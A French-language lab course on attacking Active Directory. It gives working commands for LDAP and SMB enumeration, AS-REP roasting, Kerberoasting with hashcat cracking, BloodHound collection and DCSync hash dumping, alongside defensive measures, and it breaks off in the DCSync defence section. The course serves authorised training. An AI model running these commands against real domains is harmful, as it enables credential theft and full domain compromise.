# Active Directory — Enumeration & Credential Abuse

> Module : `Active_directory/0x02-AD_Enumeration_attack`  
> Objectif : comprendre, énumérer et exploiter des mauvaises configurations Active Directory liées aux identifiants dans un lab autorisé.  
> Environnement : Kali Linux → Windows Server 2019 Domain Controller → Windows 11 workstation.  
> Outils principaux : `ldapsearch`, Impacket, `hashcat`, BloodHound, Responder, Metasploit.  
> Important : ce cours est conçu pour un environnement de formation contrôlé. Toutes les commandes doivent être exécutées uniquement sur ton lab ou sur un périmètre explicitement autorisé.

---

## Sommaire

- [1. Vision globale du module](#1-vision-globale-du-module)
- [2. Préparation du lab](#2-préparation-du-lab)
- [3. Rappels indispensables Active Directory](#3-rappels-indispensables-active-directory)
- [4. Authentification AD : LDAP, Kerberos, NTLM](#4-authentification-ad--ldap-kerberos-ntlm)
- [5. Méthodologie d’énumération AD](#5-méthodologie-dénumération-ad)
- [6. Énumération LDAP manuelle](#6-énumération-ldap-manuelle)
- [7. Énumération SMB, RPC, DNS et partages](#7-énumération-smb-rpc-dns-et-partages)
- [8. AS-REP Roasting](#8-as-rep-roasting)
- [9. Kerberoasting](#9-kerberoasting)
- [10. BloodHound et analyse des chemins d’attaque](#10-bloodhound-et-analyse-des-chemins-dattaque)
- [11. LDAP et attributs sensibles : adminDescription, comment, info](#11-ldap-et-attributs-sensibles--admindescription-comment-info)
- [12. DCSync Attack](#12-dcsync-attack)
- [13. Responder, NTLM et collecte de hashes](#13-responder-ntlm-et-collecte-de-hashes)
- [14. Metasploit dans un contexte AD](#14-metasploit-dans-un-contexte-ad)
- [15. Interprétation des résultats et priorisation](#15-interprétation-des-résultats-et-priorisation)
- [16. Détection et défense](#16-détection-et-défense)
- [17. Cheatsheet de commandes](#17-cheatsheet-de-commandes)
- [18. Méthode de résolution des tasks du module](#18-méthode-de-résolution-des-tasks-du-module)
- [19. Troubleshooting](#19-troubleshooting)
- [20. Glossaire](#20-glossaire)
- [21. Checklist finale](#21-checklist-finale)

---

# 1. Vision globale du module

Le module **Active Directory — Enumeration & Credential Abuse** est la suite logique du module **Active Directory — Fundamentals**.

Dans le module précédent, tu as appris à comprendre :

- ce qu’est un domaine Active Directory ;
- le rôle d’un Domain Controller ;
- l’importance de LDAP ;
- les objets AD : users, groups, OUs, computers, domain object ;
- les attributs standards et non standards ;
- les premiers réflexes d’énumération.

Dans ce module, tu passes à une phase plus offensive : **l’énumération active et l’abus d’identifiants**.

L’idée centrale est simple :

```text
Un attaquant interne ne commence presque jamais par exploiter.
Il commence par comprendre le domaine.
```

Avant d’escalader, il faut savoir :

- quels utilisateurs existent ;
- quels groupes sont privilégiés ;
- quels comptes de service sont présents ;
- quels comptes ont des SPN ;
- quels comptes ont Kerberos pre-auth désactivé ;
- quels comptes ont des permissions dangereuses ;
- quels chemins mènent vers Domain Admin ;
- quels secrets sont stockés dans LDAP ;
- quels comptes peuvent répliquer les secrets du domaine.

L’énumération AD est donc la phase qui transforme une position initiale faible en carte d’attaque exploitable.

---

## 1.1. Pourquoi l’énumération AD est critique

Active Directory contient énormément d’informations utiles pour un administrateur, mais aussi pour un attaquant :

```text
Utilisateurs
Groupes
Ordinateurs
Contrôleurs de domaine
Relations de confiance
GPOs
ACLs
SPNs
Descriptions
Attributs administratifs
Permissions de réplication
Relations de délégation
```

Dans un environnement mal durci, un simple utilisateur du domaine peut souvent lire une grande quantité d’informations.

Un attaquant qui possède seulement un compte utilisateur basique peut parfois :

1. énumérer les utilisateurs ;
2. trouver un compte AS-REP roastable ;
3. récupérer un hash Kerberos ;
4. cracker le mot de passe hors ligne ;
5. utiliser ce compte pour lire des attributs LDAP sensibles ;
6. trouver un compte de service Kerberoastable ;
7. cracker un autre mot de passe ;
8. découvrir un chemin BloodHound vers un groupe privilégié ;
9. obtenir un compte avec droits DCSync ;
10. extraire des secrets du domaine.

Ce module te fait travailler plusieurs briques de cette chaîne.

---

## 1.2. Objectifs pédagogiques

À la fin du module, tu dois pouvoir expliquer clairement :

- pourquoi l’énumération AD est le début de presque toute attaque interne ;
- comment interroger LDAP avec et sans authentification ;
- comment repérer un compte sans Kerberos pre-authentication ;
- comment fonctionne AS-REP Roasting ;
- comment fonctionne Kerberoasting ;
- pourquoi les SPN sont importants ;
- comment utiliser Hashcat pour cracker des tickets Kerberos ;
- comment utiliser BloodHound pour analyser des relations AD ;
- comment inspecter des attributs LDAP cachés ou oubliés ;
- comment fonctionne une attaque DCSync ;
- quels événements et durcissements permettent de détecter ou limiter ces attaques.

---

## 1.3. Cadre autorisé

Ce cours donne des commandes offensives. Elles sont légitimes uniquement dans un cadre :

```text
Lab personnel
Environnement école
CTF
Pentest contractualisé
Bug bounty explicitement autorisé
Simulation interne validée
```

À ne jamais faire :

```text
Scanner un domaine d’entreprise sans autorisation
Lancer Responder sur un réseau public ou tiers
Tenter un DCSync hors lab
Cracker des hashes qui ne viennent pas d’un environnement autorisé
Réutiliser des identifiants obtenus hors périmètre
```

---

# 2. Préparation du lab

## 2.1. Machines attendues

Le module repose sur trois VM :

| VM | Rôle |
|---|---|
| Kali Linux | Machine d’attaque et d’analyse |
| Windows Server 2019 | Domain Controller / Active Directory |
| Windows 11 Enterprise | Workstation victime |

Le travail offensif doit être fait depuis Kali vers Windows Server.

La VM Windows 11 sert de poste membre du domaine et peut être utile pour simuler un endpoint utilisateur.

---

## 2.2. Réseau

Les trois machines doivent être sur le même réseau VMware ou VirtualBox.

Exemple typique :

```text
Kali             192.168.220.130
Windows Server   192.168.220.128
Windows 11       192.168.220.129
Gateway VMware   192.168.220.2
```

Vérifications depuis Kali :

```bash
ip a
ip route
```

Découverte des hôtes :

```bash
sudo nmap -sn 192.168.220.0/24
```

Scan des ports AD :

```bash
sudo nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 <IP_DC>
```

Un Domain Controller expose souvent :

```text
53/tcp     DNS
88/tcp     Kerberos
135/tcp    MSRPC
139/tcp    NetBIOS
389/tcp    LDAP
445/tcp    SMB
464/tcp    Kerberos password change
593/tcp    RPC over HTTP
636/tcp    LDAPS
3268/tcp   Global Catalog
3269/tcp   Global Catalog SSL
```

---

## 2.3. Résolution DNS

Kerberos dépend fortement du DNS.

Même si beaucoup de commandes acceptent une IP, il est préférable d’avoir une résolution correcte.

Ajoute le DC dans `/etc/hosts` si nécessaire :

```bash
sudo nano /etc/hosts
```

Exemple :

```text
192.168.220.128 DC01.PENTESTLAB.local DC01 PENTESTLAB.local
```

Teste :

```bash
ping -c 2 DC01.PENTESTLAB.local
nslookup PENTESTLAB.local 192.168.220.128
```

---

## 2.4. Synchronisation temporelle

Kerberos tolère peu les écarts d’heure. Si ton horloge Kali est trop décalée du DC, tu peux avoir :

```text
KRB_AP_ERR_SKEW
Clock skew too great
```

Vérifie l’heure :

```bash
date
```

Synchronise si nécessaire :

```bash
sudo ntpdate -u 192.168.220.128
```

---

## 2.5. Outils à vérifier sur Kali

### Impacket

```bash
impacket-GetNPUsers -h
impacket-GetUserSPNs -h
impacket-secretsdump -h
```

Selon l’installation, les scripts peuvent aussi exister sous forme :

```bash
GetNPUsers.py
GetUserSPNs.py
secretsdump.py
```

### Hashcat

```bash
hashcat --help
hashcat -I
```

### ldapsearch

```bash
ldapsearch -VV
```

### BloodHound collector Python

```bash
bloodhound-python -h
```

### Responder

```bash
responder -h
```

### Metasploit

```bash
msfconsole -q
```

---

## 2.6. Organisation des notes

Crée un dossier de travail :

```bash
mkdir -p ~/AD_Enumeration_Attack/{scans,ldap,hashes,bloodhound,loot,notes}
cd ~/AD_Enumeration_Attack
```

Structure conseillée :

```text
AD_Enumeration_Attack/
├── scans/
├── ldap/
├── hashes/
├── bloodhound/
├── loot/
└── notes/
```

Chaque exo doit avoir des preuves propres :

```text
0_asrep_users.txt
0_asrep_hash.txt
0_hashcat_result.txt
1_kerberoast_spns.txt
2_bloodhound_collection/
3_adminDescription_ldap.txt
4_dcsync_output_sanitized.txt
```

Ne mets jamais de secrets réels dans un repo public.

---

# 3. Rappels indispensables Active Directory

## 3.1. Domaine

Un domaine AD est une frontière logique d’administration et d’authentification.

Exemple :

```text
PENTESTLAB.local
```

Son DN LDAP :

```text
DC=PENTESTLAB,DC=local
```

---

## 3.2. Domain Controller

Un Domain Controller est un serveur qui héberge la base AD et fournit :

- authentification Kerberos ;
- LDAP ;
- DNS ;
- réplication ;
- politiques de groupe ;
- Global Catalog selon configuration.

Dans un pentest interne, le DC est une cible centrale, mais aussi une source d’information massive.

---

## 3.3. Utilisateurs

Un utilisateur AD est un objet avec des attributs :

```text
cn
distinguishedName
sAMAccountName
userPrincipalName
description
memberOf
servicePrincipalName
userAccountControl
pwdLastSet
lastLogonTimestamp
adminCount
```

---

## 3.4. Groupes

Les groupes servent à attribuer des droits.

Groupes critiques :

```text
Domain Admins
Enterprise Admins
Administrators
Schema Admins
Account Operators
Backup Operators
Server Operators
DnsAdmins
Group Policy Creator Owners
```

---

## 3.5. Ordinateurs

Les ordinateurs sont aussi des objets AD.

Un compte ordinateur finit souvent par `$` :

```text
WIN11$
DC01$
SQL01$
```

Ils ont aussi des mots de passe, des SPN et des permissions.

---

## 3.6. SPN

SPN signifie **Service Principal Name**.

Un SPN lie un service à un compte.

Exemples :

```text
HTTP/webapp.pentestlab.local
MSSQLSvc/sql01.pentestlab.local:1433
CIFS/fileserver.pentestlab.local
```

Un compte avec SPN peut être ciblé par Kerberoasting.

---

## 3.7. ACLs et permissions

Active Directory utilise des ACLs pour définir qui peut faire quoi.

Exemples de droits intéressants :

```text
GenericAll
GenericWrite
WriteDACL
WriteOwner
AllExtendedRights
ForceChangePassword
AddMember
ReadGMSAPassword
AllowedToDelegate
Replicating Directory Changes
Replicating Directory Changes All
```

BloodHound sert notamment à visualiser ces relations.

---

# 4. Authentification AD : LDAP, Kerberos, NTLM

## 4.1. LDAP

LDAP sert à interroger l’annuaire.

Port :

```text
389/tcp
```

Version chiffrée :

```text
636/tcp
```

Exemple RootDSE :

```bash
ldapsearch -x -H ldap://<DC_IP> -s base -b "" defaultNamingContext namingContexts dnsHostName
```

---

## 4.2. Kerberos

Kerberos est le protocole d’authentification principal dans un domaine AD moderne.

Composants :

```text
Client
KDC
AS
TGS
Service
TGT
TGS ticket
```

Le KDC est hébergé par le Domain Controller.

Port :

```text
88/tcp
88/udp
```

---

## 4.3. Flux Kerberos simplifié

1. L’utilisateur demande un TGT au KDC.
2. Le KDC vérifie l’identité avec la pré-authentification.
3. Le KDC renvoie un TGT.
4. L’utilisateur demande un ticket de service pour un SPN.
5. Le KDC renvoie un TGS.
6. L’utilisateur présente le TGS au service.

---

## 4.4. Pré-authentification Kerberos

Par défaut, AD exige une preuve de connaissance du mot de passe avant de fournir un ticket AS-REP.

Si la pré-authentification est désactivée, n’importe qui peut demander un AS-REP pour ce compte.

Cela permet l’AS-REP Roasting.

---

## 4.5. NTLM

NTLM est un ancien mécanisme d’authentification challenge-response.

Il reste très présent pour compatibilité.

NTLM est souvent impliqué dans :

```text
Responder
NTLM relay
Pass-the-Hash
authentifications SMB
authentifications HTTP internes
```

---

## 4.6. Différence entre Kerberos et NTLM

| Point | Kerberos | NTLM |
|---|---|---|
| Modèle | Tickets | Challenge-response |
| Dépendance DNS | Forte | Moins forte |
| Sécurité | Meilleure si bien configuré | Ancien, plus risqué |
| Attaques liées | AS-REP roast, Kerberoast, delegation abuse | Relay, capture hash, pass-the-hash |

---

# 5. Méthodologie d’énumération AD

## 5.1. Vue d’ensemble

Une bonne énumération suit un ordre logique :

```text
1. Identifier le DC
2. Identifier le domaine
3. Valider DNS et Kerberos
4. Énumérer les utilisateurs
5. Énumérer les groupes
6. Énumérer les ordinateurs
7. Identifier les comptes de service
8. Chercher les SPN
9. Chercher les comptes sans pre-auth
10. Inspecter les attributs sensibles
11. Collecter BloodHound
12. Analyser les chemins d’attaque
13. Exploiter uniquement les chemins autorisés
14. Documenter les preuves
```

---

## 5.2. Découverte réseau

```bash
sudo nmap -sn <SUBNET>
```

Scan AD :

```bash
sudo nmap -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 <DC_IP>
```

---

## 5.3. RootDSE

```bash
ldapsearch -x -H ldap://<DC_IP> -s base -b "" defaultNamingContext namingContexts dnsHostName rootDomainNamingContext
```

---

## 5.4. Informations de domaine avec credentials

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   -s base "(objectClass=domainDNS)" "*" "+"
```

---

# 6. Énumération LDAP manuelle

## 6.1. Lister les utilisateurs

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user))'   dn sAMAccountName cn userPrincipalName description
```

---

## 6.2. Lister les groupes

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(objectClass=group)'   dn cn sAMAccountName description member
```

---

## 6.3. Lister les ordinateurs

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(objectClass=computer)'   dn dNSHostName sAMAccountName operatingSystem servicePrincipalName
```

---

## 6.4. Lister les comptes de service

Critère courant : SPN présent.

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'   dn sAMAccountName servicePrincipalName description
```

Critère par nom :

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectClass=user)(|(sAMAccountName=svc*)(sAMAccountName=*svc*)(cn=svc*)))'   dn sAMAccountName cn description servicePrincipalName
```

---

## 6.5. Lister les comptes sans Kerberos pre-auth

Le flag `DONT_REQ_PREAUTH` vaut :

```text
4194304
0x400000
```

Filtre LDAP avec matching rule bitwise :

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'   dn sAMAccountName userPrincipalName description userAccountControl
```

---

## 6.6. Lister les comptes avec SPN

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'   dn sAMAccountName servicePrincipalName memberOf description
```

---

## 6.7. Attributs intéressants en audit AD

```text
description
info
comment
adminDescription
memberOf
servicePrincipalName
userAccountControl
pwdLastSet
lastLogonTimestamp
accountExpires
adminCount
managedBy
msDS-AllowedToDelegateTo
msDS-AllowedToActOnBehalfOfOtherIdentity
extensionAttribute1
extensionAttribute2
extensionAttribute3
```

---

## 6.8. Sauvegarder proprement

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '<FILTER>' "*" "+" > ldap/output.txt
```

Recherche dans la sortie :

```bash
grep -iE "flag|secret|password|pwd|pass|comment|description|adminDescription|info|svc|spn|dcsync|replicat" ldap/output.txt
```

---

# 7. Énumération SMB, RPC, DNS et partages

## 7.1. SMB

SMB est central dans Windows.

Port :

```text
445/tcp
```

Enumération basique :

```bash
smbclient -L //<DC_IP>/ -U '<DOMAIN>\student'
```

Lister un partage :

```bash
smbclient //<DC_IP>/SYSVOL -U '<DOMAIN>\student'
```

---

## 7.2. SYSVOL

`SYSVOL` contient des fichiers de GPO accessibles aux machines du domaine.

À inspecter :

```text
scripts
policies
Preferences
Groups.xml
Services.xml
ScheduledTasks.xml
Drives.xml
```

Ancienne vulnérabilité classique : mots de passe `cpassword` dans Group Policy Preferences.

Même si c’est corrigé depuis longtemps, des fichiers legacy peuvent rester.

---

## 7.3. RPC

Enumération RPC :

```bash
rpcclient -U '<DOMAIN>\student' <DC_IP>
```

Commandes utiles dans `rpcclient` :

```text
enumdomusers
enumdomgroups
queryuser <RID>
querygroup <RID>
```

---

## 7.4. DNS

Interroger le DNS du DC :

```bash
nslookup PENTESTLAB.local <DC_IP>
nslookup DC01.PENTESTLAB.local <DC_IP>
```

Tester une zone transfer, souvent refusée :

```bash
dig axfr PENTESTLAB.local @<DC_IP>
```

---

# 8. AS-REP Roasting

## 8.1. Principe

AS-REP Roasting exploite les comptes AD pour lesquels la pré-authentification Kerberos est désactivée.

Normalement, Kerberos exige que l’utilisateur prouve qu’il connaît son mot de passe avant que le KDC renvoie une réponse exploitable.

Si la pré-authentification est désactivée :

```text
Un attaquant peut demander un AS-REP pour ce compte sans connaître le mot de passe.
La réponse est chiffrée avec une clé dérivée du mot de passe de l’utilisateur.
L’attaquant peut cracker cette réponse hors ligne.
```

C’est une attaque hors ligne : elle ne nécessite pas de tester des milliers de mots de passe contre le DC.

---

## 8.2. Pourquoi c’est dangereux

Un compte sans pre-auth est dangereux si :

- le mot de passe est faible ;
- le compte a des droits intéressants ;
- le compte donne accès à d’autres attributs ;
- le compte est membre d’un groupe sensible ;
- le compte est réutilisé ailleurs.

---

## 8.3. Détection LDAP du flag DONT_REQ_PREAUTH

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'   dn sAMAccountName userPrincipalName description userAccountControl
```

---

## 8.4. Avec Impacket GetNPUsers

Avec un compte authentifié :

```bash
impacket-GetNPUsers '<DOMAIN>/<USER>:<PASSWORD>'   -dc-ip <DC_IP>   -request   -outputfile hashes/asrep_hashes.txt
```

Avec une liste d’utilisateurs :

```bash
impacket-GetNPUsers '<DOMAIN>/'   -dc-ip <DC_IP>   -usersfile users.txt   -no-pass   -outputfile hashes/asrep_hashes.txt
```

Dans ton lab, privilégie la méthode attendue par l’exercice.

---

## 8.5. Format du hash AS-REP

Un hash AS-REP ressemble souvent à :

```text
$krb5asrep$23$user@DOMAIN:...
```

Le type `$krb5asrep$23$` indique généralement un format compatible avec Hashcat mode `18200`.

---

## 8.6. Cracker avec Hashcat

```bash
hashcat -m 18200 hashes/asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Afficher le résultat :

```bash
hashcat -m 18200 hashes/asrep_hashes.txt --show
```

---

## 8.7. Utiliser les credentials récupérés

Après récupération du mot de passe, valide sans brutaliser :

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\<ROASTED_USER>'   -w '<CRACKED_PASSWORD>'   -b '<BASE_DN>'   -s base "(objectClass=domainDNS)" dn
```

Ensuite, interroge uniquement l’objet concerné pour lire l’attribut attendu :

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\<ROASTED_USER>'   -w '<CRACKED_PASSWORD>'   -b '<DN_DU_COMPTE>'   -s base "(objectClass=user)" "*" "+"
```

Dans la task du module, l’indice précise que le flag est dans l’attribut `comment` du compte vulnérable.

---

## 8.8. Défense contre AS-REP Roasting

Mesures défensives :

```text
Activer Kerberos pre-authentication sur tous les comptes.
Auditer régulièrement userAccountControl.
Utiliser des mots de passe longs et aléatoires pour comptes de service.
Surveiller les événements Kerberos suspects.
Désactiver les comptes inutilisés.
Éviter les descriptions révélatrices.
```

Filtre défensif :

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

---

# 9. Kerberoasting

## 9.1. Principe

Kerberoasting cible les comptes ayant un SPN.

Dans Kerberos, un utilisateur authentifié peut demander un ticket de service pour un SPN.

Ce ticket est chiffré avec une clé liée au mot de passe du compte de service.

Si l’attaquant récupère ce ticket, il peut tenter de le cracker hors ligne.

---

## 9.2. Différence AS-REP Roasting / Kerberoasting

| Point | AS-REP Roasting | Kerberoasting |
|---|---|---|
| Cible | Compte sans pre-auth | Compte avec SPN |
| Auth requise | Pas toujours | Oui, généralement |
| Objet récupéré | AS-REP | TGS |
| Hashcat courant | 18200 | 13100 pour RC4 |
| Cause | Pre-auth désactivée | SPN sur compte avec mot de passe faible |

---

## 9.3. Trouver les comptes avec SPN

LDAP :

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))'   dn sAMAccountName servicePrincipalName description memberOf
```

Avec Impacket :

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
```

---

## 9.4. Demander les tickets Kerberoastables

```bash
impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>'   -dc-ip <DC_IP>   -request   -outputfile hashes/kerberoast_hashes.txt
```

---

## 9.5. Cracker avec Hashcat

Pour un TGS RC4 classique :

```bash
hashcat -m 13100 hashes/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Afficher le résultat :

```bash
hashcat -m 13100 hashes/kerberoast_hashes.txt --show
```

Autres modes possibles selon le type de ticket :

```text
13100 → Kerberos 5 TGS-REP etype 23 / RC4
19600 → Kerberos 5 TGS-REP etype 17 / AES128
19700 → Kerberos 5 TGS-REP etype 18 / AES256
```

---

## 9.6. Pourquoi les comptes de service sont souvent faibles

Les comptes de service ont parfois :

```text
mot de passe ancien
mot de passe jamais expiré
mot de passe partagé entre équipes
mot de passe documenté dans un outil
droits élevés
SPN exposé
```

Ce combo rend Kerberoasting très rentable.

---

## 9.7. Post-crack

Après avoir trouvé un mot de passe :

1. valider l’authentification prudemment ;
2. énumérer les groupes du compte ;
3. rechercher les droits particuliers ;
4. inspecter les attributs du compte ;
5. regarder BloodHound pour les chemins d’attaque.

Validation LDAP :

```bash
ldapsearch -LLL -x -H ldap://<DC_IP>   -D '<DOMAIN>\<SERVICE_ACCOUNT>'   -w '<CRACKED_PASSWORD>'   -b '<BASE_DN>'   -s base "(objectClass=domainDNS)" dn
```

---

## 9.8. Défense contre Kerberoasting

```text
Utiliser des mots de passe très longs pour comptes de service.
Favoriser les gMSA quand possible.
Éviter RC4.
Désactiver les SPN inutiles.
Surveiller les demandes massives de TGS.
Réduire les privilèges des comptes de service.
Auditer les comptes avec SPN.
```

PowerShell défensif :

```powershell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName,PasswordLastSet,MemberOf
```

---

# 10. BloodHound et analyse des chemins d’attaque

## 10.1. Rôle de BloodHound

BloodHound modélise Active Directory sous forme de graphe.

Il permet d’identifier des chemins comme :

```text
Utilisateur faible → Groupe intermédiaire → Droit d’écriture → Groupe admin
Utilisateur → Session sur machine → Admin local → Dump credentials
Compte service → GenericAll sur utilisateur → Escalade
Compte → DCSync rights → Domain compromise
```

---

## 10.2. Ce que BloodHound collecte

Selon la méthode de collecte :

```text
Users
Groups
Computers
Sessions
Local admins
RDP rights
DCom rights
PSRemote rights
ACLs
GPOs
OUs
Trusts
Group memberships
SPNs
Delegation
```

---

## 10.3. Collecte depuis Kali avec bloodhound-python

Commande type :

```bash
bloodhound-python -u '<USER>' -p '<PASSWORD>'   -d '<DOMAIN_FQDN>'   -ns <DC_IP>   -dc <DC_HOSTNAME>   -c All   --zip
```

Exemple structurel :

```bash
bloodhound-python -u student -p 'Str0ngPass!2026'   -d PENTESTLAB.local   -ns 192.168.220.128   -dc DC01.PENTESTLAB.local   -c All   --zip
```

Si tu as des problèmes DNS, vérifie `/etc/hosts`.

---

## 10.4. Collections courantes

```text
Default
Group
LocalAdmin
Session
Trusts
ACL
ObjectProps
Container
RDP
DCOM
PSRemote
LoggedOn
All
```

Dans un lab, `All` est pratique. En production, il faut être plus précis et respecter le périmètre.

---

## 10.5. Import dans BloodHound

Processus :

1. lancer Neo4j si nécessaire ;
2. ouvrir BloodHound ;
3. se connecter ;
4. importer les JSON ou ZIP ;
5. lancer les requêtes d’analyse.

---

## 10.6. Requêtes utiles

Dans l’interface BloodHound :

```text
Find Shortest Paths to Domain Admins
Find Principals with DCSync Rights
Find Kerberoastable Users
Find AS-REP Roastable Users
Find Computers where Domain Users are Local Admin
Find Users with GenericAll
Find Users with AddMember
Find Dangerous Rights
```

---

## 10.7. Interpréter un chemin

Un chemin BloodHound n’est pas automatiquement une exploitation.

Il faut vérifier :

```text
Le droit est-il réel ?
Le compte est-il utilisable ?
Le chemin est-il dans le périmètre ?
L’action est-elle autorisée ?
Y a-t-il un impact défendable ?
Peut-on prouver sans casser ?
```

---

## 10.8. Exemple de lecture d’un edge

| Edge | Sens |
|---|---|
| `MemberOf` | Le principal est membre d’un groupe |
| `AdminTo` | Admin local sur une machine |
| `HasSession` | Session active d’un utilisateur sur une machine |
| `GenericAll` | Contrôle complet sur l’objet |
| `GenericWrite` | Écriture générique sur l’objet |
| `WriteDACL` | Peut modifier les permissions |
| `ForceChangePassword` | Peut réinitialiser le mot de passe |
| `AddMember` | Peut ajouter un membre à un groupe |
| `AllowedToDelegate` | Délégation possible |
| `DCSync` | Peut répliquer les secrets du domaine |

---

# 11. LDAP et attributs sensibles : adminDescription, comment, info

## 11.1. Pourquoi inspecter les attributs

Les administrateurs utilisent parfois AD comme bloc-notes.

Exemples de mauvaises pratiques :

```text
description: Password: ...
info: old admin password
comment: temporary secret
adminDescription: do not disable, used for backup
extensionAttribute1: token
```

---

## 11.2. Attributs à rechercher

```text
description
info
comment
adminDescription
adminDisplayName
extensionAttribute1
extensionAttribute2
extensionAttribute3
managedBy
memberOf
servicePrincipalName
userParameters
```

---

## 11.3. Requête ciblée sur tous les utilisateurs

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user))'   dn sAMAccountName description info comment adminDescription extensionAttribute1
```

---

## 11.4. Requête complète et grep

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<BASE_DN>'   '(&(objectCategory=person)(objectClass=user))' "*" "+"   > ldap/users_full.txt

grep -iE "flag|secret|password|pass|pwd|comment|admindescription|description|info|legacy|backup|dcsync" ldap/users_full.txt
```

---

## 11.5. Requête sur un compte précis

```bash
ldapsearch -LLL -o ldif-wrap=no -x -H ldap://<DC_IP>   -D '<DOMAIN>\student'   -w '<PASSWORD>'   -b '<USER_DN>'   -s base "(objectClass=user)" "*" "+"
```

---

## 11.6. LDIF et base64

Si LDAP affiche :

```text
description:: U29tZSB0ZXh0
```

le double `::` indique une valeur encodée en base64.

Décodage :

```bash
echo 'U29tZSB0ZXh0' | base64 -d
```

---

## 11.7. Pourquoi `adminDescription` est intéressant

`adminDescription` est moins visible que `description` dans beaucoup d’outils.

Un administrateur peut y mettre des notes sans penser qu’elles sont lisibles par LDAP.

Dans le module, une task cible explicitement cet attribut.

---

# 12. DCSync Attack

## 12.1. Principe

DCSync simule le comportement d’un Domain Controller qui demande la réplication des secrets AD.

Au lieu de dumper directement le fichier `NTDS.dit` sur disque, l’attaquant utilise les protocoles de réplication AD pour demander les secrets.

Cela nécessite des droits spécifiques.

---

## 12.2. Droits nécessaires

Droits critiques :

```text
DS-Replication-Get-Changes
DS-Replication-Get-Changes-All
DS-Replication-Get-Changes-In-Filtered-Set
```

Dans BloodHound, on parle souvent d’un edge :

```text
DCSync
```

---

## 12.3. Pourquoi c’est critique

Avec DCSync, un compte autorisé peut récupérer :

```text
hash NTLM d’un utilisateur
hash du compte krbtgt
secrets de comptes sensibles
matériel permettant Golden Ticket selon contexte
```

C’est un niveau d’impact très élevé.

---

## 12.4. Identifier les comptes avec DCSync

BloodHound :

```text
Find Principals with DCSync Rights
```

LDAP/ACL manuelle : plus complexe, car il faut analyser les security descriptors.

En pratique pédagogique, BloodHound est le moyen le plus lisible.

---

## 12.5. Exploitation avec secretsdump

Commande structurelle :

```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASSWORD>@<DC_IP>' -just-dc-user '<TARGET_USER>'
```

Exemple pour un utilisateur précis :

```bash
impacket-secretsdump 'PENTESTLAB/user:Password123@192.168.220.128' -just-dc-user Administrator
```

Dump domaine complet dans un lab autorisé :

```bash
impacket-secretsdump 'PENTESTLAB/user:Password123@192.168.220.128' -just-dc
```

À utiliser uniquement si la task l’exige et dans le lab.

---

## 12.6. Sortie typique

La sortie peut contenir des lignes de type :

```text
user:RID:LMHASH:NTHASH:::
```

Le hash important est souvent le hash NTLM.

Exemple structurel :

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:NT_HASH_ICI:::
```

`aad3b435...` correspond souvent au hash LM vide/désactivé.

---

## 12.7. DCSync vs dump local

| Technique | Besoin | Risque |
|---|---|---|
| Dump `NTDS.dit` local | Accès admin au DC | Très intrusif |
| DCSync | Droits de réplication | Très critique mais distant |
| LSASS dump | Admin local sur machine | Détection élevée |
| Secretsdump remote | Admin/rights adaptés | Fort impact |

---

## 12.8. Défense DCSync

Mesures :

```text
Limiter strictement les droits de réplication.
Auditer les ACLs du domaine.
Surveiller Event ID 4662 sur les opérations de réplication.
Protéger les comptes privilégiés.
Utiliser tiering model.
Contrôler les membres de Domain Admins/Administrators.
